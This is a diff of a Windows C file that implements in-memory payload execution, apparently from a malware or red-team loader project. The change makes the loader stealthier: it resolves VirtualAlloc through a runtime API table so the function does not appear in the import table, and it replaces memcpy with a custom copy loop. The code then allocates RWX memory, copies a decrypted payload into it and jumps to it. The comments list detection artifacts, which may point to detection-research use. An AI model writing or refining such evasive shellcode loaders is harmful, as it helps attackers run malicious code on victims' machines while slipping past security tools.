@@ -1,49 +1,44 @@
 /*
- * Memory Execution Implementation - Windows
+ * Memory execution — Windows.
  *
- * Uses VirtualAlloc with PAGE_EXECUTE_READWRITE for RWX allocation.
- * This is a common technique detectable via memory forensics.
+ * Allocates RWX memory via the runtime-resolved VirtualAlloc pointer,
+ * copies the decrypted payload, and jumps. No direct Win32 calls; no
+ * IAT imports for VirtualAlloc/VirtualFree.
  *
- * Detection artifact: RWX private allocation
- * Memory forensics: PE in unbacked memory (VAD analysis)
- * YARA signature target: stage1_imports.yar (VirtualAlloc)
+ * Detection artifact: RWX private allocation + unbacked-code execution.
  */
 
 #ifdef _WIN32
 
 #include "mem_exec.h"
+#include "api_table.h"
+
 #include <windows.h>
-#include <string.h>
+
+static void mem_copy(void *dst, const void *src, size_t n) {
+    unsigned char *d = (unsigned char *)dst;
+    const unsigned char *s = (const unsigned char *)src;
+    for (size_t i = 0; i < n; i++) d[i] = s[i];
+}
 
 int mem_run(const uint8_t *code, size_t len)
 {
-    if (!code || len == 0) {
+    if (!code || len == 0 || !g_api.VirtualAlloc || !g_api.VirtualFree) {
         return -1;
     }
 
-    /*
-     * Allocate RWX memory.
-     * PAGE_EXECUTE_READWRITE is suspicious and detectable.
-     */
-    void *mem = VirtualAlloc(
-        NULL,
-        len,
+    void *mem = g_api.VirtualAlloc(
+        NULL, len,
         MEM_COMMIT | MEM_RESERVE,
         PAGE_EXECUTE_READWRITE);
+    if (!mem) return -1;
 
-    if (!mem) {
-        return -1;
-    }
+    mem_copy(mem, code, len);
 
-    /* Copy code to executable memory */
-    memcpy(mem, code, len);
-
-    /* Cast to function pointer and call */
     void (*entry)(void) = (void (*)(void))mem;
     entry();
 
-    /* If we return, free and succeed */
-    VirtualFree(mem, 0, MEM_RELEASE);
+    g_api.VirtualFree(mem, 0, MEM_RELEASE);
     return 0;
 }
 
